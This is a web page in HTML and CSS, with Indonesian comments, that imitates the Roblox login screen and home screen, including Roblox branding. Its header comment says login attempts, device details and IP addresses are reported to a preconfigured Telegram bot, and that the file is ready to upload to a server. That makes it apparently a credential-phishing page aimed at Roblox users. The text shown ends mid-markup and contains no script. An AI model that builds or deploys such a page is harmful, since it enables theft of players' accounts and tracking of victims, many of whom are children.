<!DOCTYPE html>
<!-- 
    ROBLOX LOGIN SYSTEM DENGAN NOTIFIKASI TELEGRAM
    ==============================================
    Fitur-fitur:
    - Validasi login dengan kredensial yang valid
    - Animasi interaktif dan responsif
    - Notifikasi Telegram untuk login berhasil, gagal, dan logout
    - Deteksi perangkat, browser, dan OS
    - Waktu dan IP tracking
    
    Konfigurasi:
    - Telegram Bot Token dan Chat ID sudah dikonfigurasi di dalam script
    - Database user tersedia di variabel userDatabase
    - Untuk hosting, cukup upload file ini ke web server
-->
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Home Screen</title>
    <style>
        /* --- VARIABEL --- */
        :root {
            --primary-color: #0074bd;
            --secondary-color: #00a2ff;
            --accent-color: #ff7b26;
            --dark-bg: #232527;
            --medium-bg: #2a2d30;
            --light-bg: #393d41;
            --text-color: #ffffff;
            --text-secondary: #b8b9ba;
            --success-color: #5cb85c;
            --error-color: #d9534f;
            --header-height: 70px;
            --gold-color: #ffc107;
            --gem-color: #9c27b0;
        }

        /* --- RESET & DASAR --- */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: var(--dark-bg);
            color: var(--text-color);
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }

        /* --- PARTICLES BACKGROUND --- */
        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: -1;
        }

        .particle {
            position: absolute;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.1);
            pointer-events: none;
            animation: floatParticle linear infinite;
        }

        @keyframes floatParticle {
            0% {
                transform: translateY(0) rotate(0deg);
                opacity: 1;
                border-radius: 0;
            }
            100% {
                transform: translateY(-1000px) rotate(720deg);
                opacity: 0;
                border-radius: 50%;
            }
        }

        /* --- LOGIN SCREEN --- */
        .login-screen {
            width: 100%;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            perspective: 1000px;
        }

        .login-card {
            background: linear-gradient(145deg, var(--medium-bg), var(--light-bg));
            border-radius: 12px;
            padding: 2rem;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4), 
                        0 0 60px rgba(0, 116, 189, 0.1) inset;
            position: relative;
            overflow: hidden;
            transform-style: preserve-3d;
            animation: cardIntro 1s ease-out forwards;
            max-width: 450px;
            width: 100%;
        }

        @keyframes cardIntro {
            0% {
                opacity: 0;
                transform: translateY(100px) rotateX(20deg);
            }
            100% {
                opacity: 1;
                transform: translateY(0) rotateX(0);
            }
        }

        /* --- LOGO & JUDUL --- */
        .logo-container {
            text-align: center;
            margin-bottom: 2.5rem;
            position: relative;
            padding-top: 40px;
        }

        .logo {
            width: 80px;
            height: 80px;
            position: absolute;
            top: -40px;
            right: 10px;
            animation: logoSpin 3s ease-in-out infinite;
            filter: drop-shadow(0 0 10px rgba(0, 116, 189, 0.7));
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect x="15" y="15" width="30" height="30" rx="5" fill="%230074bd" /><rect x="55" y="15" width="30" height="30" rx="5" fill="%23ff7b26" /><rect x="15" y="55" width="30" height="30" rx="5" fill="%2300a2ff" /><rect x="55" y="55" width="30" height="30" rx="5" fill="%23b8b9ba" /></svg>');
            background-size: cover;
            z-index: 5;
        }

        @keyframes logoSpin {
            0% {
                transform: rotateY(0deg);
            }
            50% {
                transform: rotateY(180deg);
            }
            100% {
                transform: rotateY(360deg);
            }
        }

        .title {
            font-size: 2rem;
            font-weight: 700;
            margin-bottom: 0.5rem;
            color: #0074bd;
            position: relative;
            display: inline-block;
            animation: titleGlow 3s ease-in-out infinite;
            padding: 5px 15px;
        }

        @keyframes titleGlow {
            0%, 100% {
                filter: drop-shadow(0 0 5px rgba(0, 116, 189, 0.3));
            }
            50% {
                filter: drop-shadow(0 0 15px rgba(0, 116, 189, 0.7));
            }
        }

        .subtitle {
            color: var(--text-secondary);
            margin-bottom: 2rem;
            font-size: 1rem;
            opacity: 0;
            transform: translateY(20px);
            animation: fadeInUp 0.8s ease-out 0.3s forwards;
        }

        @keyframes fadeInUp {
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* --- FORM LOGIN --- */
        .form-group {
            margin-bottom: 1.5rem;
            position: relative;
            opacity: 0;
            transform: translateX(-20px);
        }

        .username-container {
            animation: fadeInRight 0.5s ease-out 0.6s forwards;
        }

        .password-container {
            animation: fadeInRight 0.5s ease-out 0.8s forwards;
        }

        @keyframes fadeInRight {
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 500;
            color: var(--text-secondary);
            font-size: 0.9rem;
        }

        input {
            width: 100%;
            padding: 0.8rem 1rem;
            background-color: rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            color: var(--text-color);
            font-size: 1rem;
            transition: all 0.3s;
        }

        input:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 2px rgba(0, 116, 189, 0.3);
        }

        input::placeholder {
            color: rgba(255, 255, 255, 0.4);
        }

        .input-icon {
            position: absolute;
            right: 12px;
            top: 40px;
            color: var(--text-secondary);
            font-size: 1.2rem;
        }

        /* --- REMEMBER ME --- */
        .remember-me {
            display: flex;
            align-items: center;
            cursor: pointer;
        }

        .checkbox-container {
            position: relative;
            width: 18px;
            height: 18px;
            margin-right: 8px;
            border-radius: 3px;
            border: 2px solid var(--text-secondary);
            overflow: hidden;
        }

        .checkbox-container input {
            position: absolute;
            opacity: 0;
            width: 100%;
            height: 100%;
            cursor: pointer;
        }

        .checkbox-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: var(--primary-color);
            transform: scale(0);
            transition: all 0.2s;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 12px;
        }

        input:checked ~ .checkbox-overlay {
            transform: scale(1);
        }

        .remember-text {
            font-size: 0.9rem;
            color: var(--text-secondary);
        }

        .extra-features {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 2rem;
            opacity: 0;
            animation: fadeIn 0.5s ease-out 1s forwards;
        }

        @keyframes fadeIn {
            to {
                opacity: 1;
            }
        }

        .forgot-password {
            font-size: 0.9rem;
            color: var(--primary-color);
            text-decoration: none;
            transition: all 0.2s;
        }

        .forgot-password:hover {
            color: var(--secondary-color);
            text-decoration: underline;
        }

        /* --- TOMBOL LOGIN --- */
        .login-button {
            width: 100%;
            padding: 0.9rem;
            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
            border: none;
            border-radius: 8px;
            color: white;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
            opacity: 0;
            transform: translateY(20px);
            animation: fadeInUp 0.5s ease-out 1.2s forwards;
        }

        .login-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }

        .login-button:active {
            transform: translateY(0);
        }

        .login-button .ripple {
            position: absolute;
            border-radius: 50%;
            background-color: rgba(255, 255, 255, 0.7);
            transform: scale(0);
            animation: ripple 0.6s linear;
        }

        @keyframes ripple {
            to {
                transform: scale(4);
                opacity: 0;
            }
        }

        /* --- STATUS LOGIN --- */
        .login-status {
            text-align: center;
            height: 20px;
            margin-top: 1rem;
            font-size: 0.9rem;
            opacity: 0;
            animation: fadeIn 0.5s ease-out 1.4s forwards;
        }

        .error-message {
            color: var(--error-color);
            animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
        }

        .success-message {
            color: var(--success-color);
        }

        @keyframes shake {
            10%, 90% { transform: translate3d(-1px, 0, 0); }
            20%, 80% { transform: translate3d(2px, 0, 0); }
            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
            40%, 60% { transform: translate3d(4px, 0, 0); }
        }
        
        /* Form shake animation */
        .shake {
            animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
            transform: translate3d(0, 0, 0);
            backface-visibility: hidden;
        }
        
        /* Input shake animation */
        .shake-input {
            animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
            border-color: var(--error-color) !important;
            box-shadow: 0 0 0 2px rgba(217, 83, 79, 0.3) !important;
        }

        /* --- SEPARATOR --- */
        .separator {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 2rem 0;
            opacity: 0;
            animation: fadeIn 0.5s ease-out 1.6s forwards;
        }

        .separator::before,
        .separator::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        .separator span {
            padding: 0 10px;
            color: var(--text-secondary);
            font-size: 0.9rem;
        }

        /* --- REGISTER LINK --- */
        .register-link {
            text-align: center;
            margin-top: 1rem;
            font-size: 0.9rem;
            color: var(--text-secondary);
            opacity: 0;
            animation: fadeIn 0.5s ease-out 1.8s forwards;
        }

        .register-link a {
            color: var(--primary-color);
            text-decoration: none;
            font-weight: 600;
            transition: all 0.2s;
        }

        .register-link a:hover {
            color: var(--secondary-color);
            text-decoration: underline;
        }

        /* --- ANIMASI LOADING --- */
        .loading {
            display: none;
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(42, 45, 48, 0.9);
            border-radius: 12px;
            justify-content: center;
            align-items: center;
            z-index: 10;
            flex-direction: column;
        }

        .loading-spinner {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255, 255, 255, 0.1);
            border-top-color: var(--primary-color);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 1rem;
        }

        .loading-text {
            font-size: 1.2rem;
            color: var(--text-color);
            animation: pulse 1.5s ease-in-out infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        @keyframes pulse {
            0%, 100% {
                opacity: 1;
            }
            50% {
                opacity: 0.5;
            }
        }

        /* --- HOME SCREEN --- */
        .home-screen {
            display: none;
            flex-direction: column;
            min-height: 100vh;
        }

        /* --- HEADER --- */
        .header {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: var(--header-height);
            background-color: var(--medium-bg);
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 2rem;
            z-index: 100;
        }

        .logo-area {
            display: flex;
            align-items: center;
        }

        .logo-small {
            width: 40px;
            height: 40px;
            margin-right: 10px;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect x="15" y="15" width="30" height="30" rx="5" fill="%230074bd" /><rect x="55" y="15" width="30" height="30" rx="5" fill="%23ff7b26" /><rect x="15" y="55" width="30" height="30" rx="5" fill="%2300a2ff" /><rect x="55" y="55" width="30" height="30" rx="5" fill="%23b8b9ba" /></svg>');
            background-size: cover;
        }

        .logo-text {
            font-size: 1.5rem;
            font-weight: 700;
            background: linear-gradient(90deg, silver, #e0e0e0);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            position: relative;
            padding: 2px 10px;
        }
        
        .logo-text::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: black;
            z-index: -1;
            border-radius: 4px;
        }

        .user-area {
            display: flex;
            align-items: center;
        }

        .currency {
            display: flex;
            margin-right: 1.5rem;
        }

        .currency-item {
            display: flex;
            align-items: center;
            background-color: rgba(0, 0, 0, 0.2);
            padding: 5px 10px;
            border-radius: 20px;
            margin-right: 10px;
        }

        .currency-icon {
            margin-right: 6px;
            font-size: 1.2rem;
        }

        .coins {
            color: var(--gold-color);
        }

        .gems {
            color: var(--gem-color);
        }

        .user-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background-color: var(--primary-color);
            margin-right: 10px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-weight: bold;
            font-size: 1.2rem;
            color: white;
        }

        .user-info {
            display: flex;
            flex-direction: column;
            margin-right: 15px;
        }

        .username {
            font-weight: 600;
            font-size: 0.9rem;
        }

        .level {
            color: var(--text-secondary);
            font-size: 0.8rem;
        }

        .logout-btn {
            padding: 6px 12px;
            background-color: var(--error-color);
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.8rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .logout-btn:hover {
            background-color: #c9302c;
        }

        /* --- MAIN CONTENT --- */
        .main-content {
            padding-top: calc(var(--header-height) + 20px);
            max-width: 1200px;
            margin: 0 auto;
            padding-bottom: 2rem;
            width: 100%;
            padding-left: 20px;
            padding-right: 20px;
        }

        /* --- ANIMATED BANNER --- */
        .banner {
            width: 100%;
            height: 250px;
            margin-bottom: 2rem;
            position: relative;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            opacity: 0;
            transform: translateY(30px);
            animation: slideUp 0.8s ease-out forwards;
        }

        @keyframes slideUp {
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .banner-bg {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, #2193b0, #6dd5ed);
            z-index: 1;
        }

        .banner-content {
            position: relative;
            z-index: 2;
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            padding: 0 2rem;
        }

        .banner-title {
            font-size: 2.5rem;
            font-weight: 800;
            margin-bottom: 1rem;
            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
            color: #0074bd;
            position: relative;
            display: inline-block;
            padding: 5px 15px;
        }

        .banner-text {
            font-size: 1.2rem;
            margin-bottom: 1.5rem;
            max-width: 600px;
        }

        .banner-btn {
            padding: 12px 24px;
            background-color: var(--accent-color);
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            font-size: 1rem;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }

        .banner-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
        }

        .banner-decoration {
            position: absolute;
            background-color: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
            z-index: 1;
        }

        .decoration-1 {
            width: 150px;
            height: 150px;
            top: -50px;
            left: -50px;
            animation: float 8s ease-in-out infinite;
        }

        .decoration-2 {
            width: 100px;
            height: 100px;
            bottom: -30px;
            right: 100px;
            animation: float 6s ease-in-out infinite 1s;
        }

        .decoration-3 {
            width: 70px;
            height: 70px;
            top: 50px;
            right: -20px;
            animation: float 7s ease-in-out infinite 0.5s;
        }

        @keyframes float {
            0%, 100% {
                transform: translateY(0) rotate(0deg);
            }
            50% {
                transform: translateY(-20px) rotate(5deg);
            }
        }

        /* --- MENU BUTTONS --- */
        .menu-section {
            margin-bottom: 2rem;
            opacity: 0;
            animation: fadeIn 0.8s ease-out 0.4s forwards;
        }

        .play-button {
            width: 100%;
            height: 80px;
            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
            border-radius: 12px;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 1rem;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
            position: relative;
            overflow: hidden;
        }

        .play-button:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
        }

        .play-button:active {
            transform: translateY(-2px);
        }

        .play-text {
            font-size: 1.8rem;
            font-weight: 800;
            z-index: 2;
            color: white;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.4);
        }

        .play-shine {
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(
                90deg,
                rgba(255, 255, 255, 0) 0%,
                rgba(255, 255, 255, 0.3) 50%,
                rgba(255, 255, 255, 0) 100%
            );
            animation: shine 3s infinite;
        }

        @keyframes shine {
            0% {
                left: -100%;
            }
            20%, 100% {
                left: 100%;
            }
        }

        .button-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 1rem;
        }

        .menu-button {
            height: 100px;
            background-color: var(--light-bg);
            border-radius: 10px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }

        .menu-button:hover {
            transform: translateY(-3px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }

        .menu-button:active {
            transform: translateY(-1px);
        }

        .button-icon {
            font-size: 1.8rem;
            margin-bottom: 0.5rem;
        }

        .button-text {
            font-weight: 600;
        }

        .button-bg {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.1;
            z-index: 0;
            background-size: cover;
            background-position: center;
            transition: all 0.3s;
        }

        .menu-button:hover .button-bg {
            opacity: 0.2;
            transform: scale(1.1);
        }

        .button-content {
            position: relative;
            z-index: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* --- GAME SUGGESTIONS --- */
        .suggestions-section {
            opacity: 0;
            animation: fadeIn 0.8s ease-out 0.8s forwards;
        }

        .section-title {
            font-size: 1.5rem;
            font-weight: 700;
            margin-bottom: 1rem;
            padding-bottom: 0.5rem;
            border-bottom: 2px solid var(--primary-color);
        }

        .game-grid {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 1rem;
        }

        .game-card {
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.2);
            transition: all 0.3s;
            cursor: pointer;
            transform: translateY(20px);
            opacity: 0;
            animation: cardEntrance 0.5s forwards;
        }

        @keyframes cardEntrance {
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .game-card:nth-child(1) { animation-delay: 0.9s; }
        .game-card:nth-child(2) { animation-delay: 1.0s; }
        .game-card:nth-child(3) { animation-delay: 1.1s; }
        .game-card:nth-child(4) { animation-delay: 1.2s; }
        .game-card:nth-child(5) { animation-delay: 1.3s; }

        .game-card:hover {
            transform: translateY(-5px) scale(1.02);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }

        .game-thumbnail {
            width: 100%;
            height: 120px;
            background-color: var(--medium-bg);
            background-size: cover;
            background-position: center;
            position: relative;
        }

        .game-info {
            padding: 0.8rem;
            background-color: var(--medium-bg);
        }

        .game-title {
            font-weight: 600;
            font-size: 0.9rem;
            margin-bottom: 0.3rem;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .game-stats {
            display: flex;
            justify-content: space-between;
            font-size: 0.8rem;
            color: var(--text-secondary);
        }

        .game-players {
            display: flex;
            align-items: center;
        }

        .players-icon {
            margin-right: 3px;
        }

        /* --- MODAL --- */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            justify-content: center;
            align-items: center;
            z-index: 999;
        }

        .modal {
            background-color: var(--medium-bg);
            border-radius: 12px;
            width: 90%;
            max-width: 500px;
            padding: 2rem;
            box-shadow: 0 5px 30px rgba(0, 0, 0, 0.5);
            position: relative;
            animation: modalPop 0.3s ease-out forwards;
        }

        @keyframes modalPop {
            0% {
                opacity: 0;
                transform: scale(0.8);
            }
            100% {
                opacity: 1;
                transform: scale(1);
            }
        }

        .modal-title {
            font-size: 1.5rem;
            font-weight: 700;
            margin-bottom: 1rem;
            text-align: center;
        }

        .modal-content {
            margin-bottom: 1.5rem;
            text-align: center;
        }

        .modal-buttons {
            display: flex;
            justify-content: center;
            gap: 1rem;
        }

        .modal-btn {
            padding: 0.8rem 1.5rem;
            border-radius: 6px;
            font-weight: 600;
            border: none;
            cursor: pointer;
            transition: all 0.3s;
        }

        .confirm-btn {
            background-color: var(--primary-color);
            color: white;
        }

        .confirm-btn:hover {
            background-color: var(--secondary-color);
        }

        .cancel-btn {
            background-color: var(--error-color);
            color: white;
        }

        .cancel-btn:hover {
            background-color: #c9302c;
        }

        .close-modal {
            position: absolute;
            top: 10px;
            right: 15px;
            font-size: 1.5rem;
            cursor: pointer;
            color: var(--text-secondary);
            transition: all 0.2s;
        }

        .close-modal:hover {
            color: var(--text-color);
        }

        /* --- LOADING OVERLAY FULLSCREEN --- */
        .fullscreen-loading {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: var(--dark-bg);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            flex-direction: column;
        }

        .progress-container {
            width: 300px;
            height: 20px;
            background-color: var(--medium-bg);
            border-radius: 10px;
            margin-top: 20px;
            overflow: hidden;
        }

        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
            border-radius: 10px;
            transition: width 0.4s;
        }

        .loading-message {
            margin-top: 15px;
            color: var(--text-secondary);
            font-size: 14px;
        }

        /* --- RESPONSIVE --- */
        @media (max-width: 1024px) {
            .game-grid {
                grid-template-columns: repeat(3, 1fr);
            }
        }

        @media (max-width: 768px) {
            .header {
                padding: 0 1rem;
            }

            .currency {
                margin-right: 0.5rem;
            }

            .user-info {
                display: none;
            }

            .banner-title {
                font-size: 2rem;
            }

            .banner-text {
                font-size: 1rem;
            }

            .button-grid {
                grid-template-columns: repeat(2, 1fr);
            }

            .game-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }

        @media (max-width: 500px) {
            .login-card {
                padding: 1.5rem;
            }

            .logo {
                width: 80px;
                height: 80px;
            }

            .title {
                font-size: 1.5rem;
            }

            .subtitle {
                font-size: 0.9rem;
            }

            .extra-features {
                flex-direction: column;
                align-items: flex-start;
            }

            .forgot-password {
                margin-top: 0.5rem;
            }

            .logo-text {
                display: none;
            }

            .banner {
                height: 200px;
            }

            .banner-title {
                font-size: 1.5rem;
            }

            .game-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <!-- PARTICLES BACKGROUND -->
    <div class="particles" id="particles"></div>
    
    <!-- LOADING SCREEN -->
    <div class="fullscreen-loading" id="initLoading">
        <div class="logo"></div>
        <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        <div class="loading-message" id="loadingMessage">Memuat sumber daya...</div>
    </div>
    
    <!-- LOGIN SCREEN -->
    <div class="login-screen" id="loginScreen" style="display: none;">
        <div class="login-card">
            <div class="logo-container">
                <div class="logo"></div>
                <h1 class="title">ROBLOX</h1>
                <p class="subtitle">Masuk untuk melanjutkan</p>
            </div>
            
            <form id="loginForm">
                <div class="form-group username-container">
                    <label for="username">Username</label>
                    <input type="text" id="username" name="username" placeholder="Masukkan username Anda" autocomplete="off">
                </div>
                
                <div class="form-group password-container">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" placeholder="Masukkan password Anda">
                </div>
                
                <div class="extra-features">
                    <label class="remember-me">
                        <div class="checkbox-container">
                            <input type="checkbox" id="remember">
                            <div class="checkbox-overlay">✓</div>
                        </div>
                        <span class="remember-text">Ingat saya</span>
                    </label>
                    
                    <a href="#" class="forgot-password">Lupa password?</a>
                </div>
                
                <button type="submit" class="login-button" id="loginButton">
                    <span class="button-text">MASUK</span>
                </button>
                
                <div class="login-status" id="loginStatus"></div>
            </form>
            
            <div class="separator">
                <span>ATAU</span>
            </div>
            
            <p class="register-link">
                Belum punya akun? <a href="#">Daftar sekarang</a>
            </p>
            
            <div class="loading" id="loadingOverlay">
                <div class="loading-spinner"></div>
                <p class="loading-text">Authenticating...</p>
            </div>
        </div>
    </div>
    
    <!-- HOME SCREEN -->
    <div class="home-screen" id="homeScreen" style="display: none;">
        <header class="header">
            <div class="logo-area">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png" alt="Roblox Logo" class="logo-small" style="width: 40px; height: 40px; margin-right: 10px;">
                <div class="logo-text">ROBLOX</div>
            </div>
            
            <div class="user-area">
                <div class="currency">
                    <div class="currency-item">
                        <span class="currency-icon coins">🪙</span>
                        <span class="coin-amount" id="coinAmount">0</span>
                    </div>
                    <div class="currency-item">
                        <span class="currency-icon gems">💎</span>
                        <span class="gem-amount" id="gemAmount">0</span>
                    </div>
                </div>
                
                <div class="user-avatar" id="userAvatar">P</div>
                
                <div class="user-info">
                    <span class="username" id="displayUsername">Pemain</span>
                    <span class="level" id="userLevel">Level 1</span>
                </div>
                
                <button class="logout-btn" id="logoutBtn">LOGOUT</button>
            </div>
        </header>
        
        <main class="main-content">
            <div class="banner">
                <div class="banner-bg"></div>
                <div class="banner-content">
                    <h1 class="banner-title">Selamat Datang di Adventure Quest!</h1>
                    <p class="banner-text">Jelajahi dunia fantasi, kalahkan monster, dan temukan harta karun legendaris.</p>
                    <button class="banner-btn">MULAI PETUALANGAN</button>
                </div>
                <div class="banner-decoration decoration-1"></div>
                <div class="banner-decoration decoration-2"></div>
                <div class="banner-decoration decoration-3"></div>
            </div>
            
            <div class="menu-section">
                <div class="play-button" id="playButton">
                    <div class="play-shine"></div>
                    <span class="play-text">PLAY</span>
                </div>
                
                <div class="button-grid">
                    <div class="menu-button" id="shopButton">
                        <div class="button-bg" style="background-image: url('data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22 fill=%22white%22><path d=%22M16 6V4c0-1.1-.9-2-2-2h-4c-1.1 0-2 .9-2 2v2H2v15h20V6h-6zm-6-2h4v2h-4V4zM9 18V9l7.5 4L9 18z%22/></svg>')"></div>
                        <div class="button-content">
                            <span class="button-icon">🛒</span>
                            <span class="button-text">SHOP</span>
                        </div>
                    </div>
                    
                    <div class="menu-button" id="inventoryButton">
                        <div class="button-bg" style="background-image: url('data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22 fill=%22white%22><path d=%22M19 5v14H5V5h14m1.1-2H3.9c-.5 0-.9.4-.9.9v16.2c0 .4.4.9.9.9h16.2c.4 0 .9-.5.9-.9V3.9c0-.5-.5-.9-.9-.9zM11 7h6v2h-6V7zm0 4h6v2h-6v-2zm0 4h6v2h-6v-2zM7 7h2v2H7V7zm0 4h2v2H7v-2zm0 4h2v2H7v-2z%22/></svg>')"></div>
                        <div class="button-content">
                            <span class="button-icon">🎒</span>
                            <span class="button-text">INVENTORY</span>
                        </div>
                    </div>
                    
                    <div class="menu-button" id="friendsButton">
                        <div class="button-bg" style="background-image: url('data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22 fill=%22white%22><path d=%22M16.5 13c-1.2 0-3.07.34-4.5 1-1.43-.67-3.3-1-4.5-1C5.33 13 1 14.08 1 16.25V19h22v-2.75c0-2.17-4.33-3.25-6.5-3.25zm-4 4.5h-10v-1.25c0-.54 2.56-1.75 5-1.75s5 1.21 5 1.75v1.25zm9 0H14v-1.25c0-.46-.2-.86-.52-1.22.88-.3 1.96-.53 3.02-.53 2.44 0 5 1.21 5 1.75v1.25zM7.5 12c1.93 0 3.5-1.57 3.5-3.5S9.43 5 7.5 5 4 6.57 4 8.5 5.57 12 7.5 12zm0-5.5c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2zm9 5.5c1.93 0 3.5-1.57 3.5-3.5S18.43 5 16.5 5 13 6.57 13 8.5s1.57 3.5 3.5 3.5zm0-5.5c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2z%22/></svg>')"></div>
                        <div class="button-content">
                            <span class="button-icon">👥</span>
                            <span class="button-text">FRIENDS</span>
                        </div>
                    </div>
                    
                    <div class="menu-button" id="settingsButton">
                        <div class="button-bg" style="background-image: url('data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22 fill=%22white%22><path d=%22M19.14,12.94c0.04-0.3,0.06-0.61,0.06-0.94c0-0.32-0.02-0.64-0.07-0.94l2.03-1.58c0.18-0.14,0.23-0.41,0.12-0.61 l-1.92-3.32c-0.12-0.22-0.37-0.29-0.59-0.22l-2.39,0.96c-0.5-0.38-1.03-0.7-1.62-0.94L14.4,2.81c-0.04-0.24-0.24-0.41-0.48-0.41 h-3.84c-0.24,0-0.43,0.17-0.47,0.41L9.25,5.35C8.66,5.59,8.12,5.92,7.63,6.29L5.24,5.33c-0.22-0.08-0.47,0-0.59,0.22L2.74,8.87 C2.62,9.08,2.66,9.34,2.86,9.48l2.03,1.58C4.84,11.36,4.8,11.69,4.8,12s0.02,0.64,0.07,0.94l-2.03,1.58 c-0.18,0.14-0.23,0.41-0.12,0.61l1.92,3.32c0.12,0.22,0.37,0.29,0.59,0.22l2.39-0.96c0.5,0.38,1.03,0.7,1.62,0.94l0.36,2.54 c0.05,0.24,0.24,0.41,0.48,0.41h3.84c0.24,0,0.44-0.17,0.47-0.41l0.36-2.54c0.59-0.24,1.13-0.56,1.62-0.94l2.39,0.96 c0.22,0.08,0.47,0,0.59-0.22l1.92-3.32c0.12-0.22,0.07-0.47-0.12-0.61L19.14,12.94z M12,15.6c-1.98,0-3.6-1.62-3.6-3.6 s1.62-3.6,3.6-3.6s3.6,1.62,3.6,3.6S13.98,15.6,12,15.6z%22/></svg>')"></div>
                        <div class="button-content">
                            <span class="button-icon">⚙️</span>
                            <span class="button-text">SETTINGS</span>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="suggestions-section">
                <h2 class="section-title">Recommended Games</h2>
                
                <div class="game-grid">
                    <div class="game-card">
